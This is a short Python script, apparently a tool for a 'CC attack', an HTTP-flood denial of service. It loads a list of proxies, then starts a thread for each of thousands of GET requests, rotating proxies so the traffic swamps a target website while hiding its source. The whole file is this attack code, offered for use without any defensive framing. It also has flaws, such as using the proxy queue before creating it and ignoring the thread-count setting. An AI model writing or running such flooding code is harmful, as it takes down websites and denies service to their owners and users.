import requests
import threading
from queue import Queue

# Read proxy list file
with open("CC-proxy_list.txt", "r") as file:
    for line in file:
        proxy_pool.put(line.strip())

def send_request(url, proxy):
    try:
        proxies = {
            "http": proxy,
            "https": proxy
        }
        response = requests.get(url, proxies=proxies, timeout=1)
        print(f"Request success: {response.status_code}")
    except requests.RequestException as e:
        print(f"Request fail: {e}")

def cc_attack(url, num_threads, num_requests):
    threads = []
    for _ in range(num_requests):
        proxy = proxy_pool.get()
        thread = threading.Thread(target=send_request, args=(url, proxy))
        threads.append(thread)
        thread.start()
        proxy_pool.put(proxy)  # put proxy back pool

    for thread in threads:
        thread.join()

# usage example
target_url = "Website URL"
num_threads = 1000
num_requests = 10000

cc_attack(target_url, num_threads, num_requests)
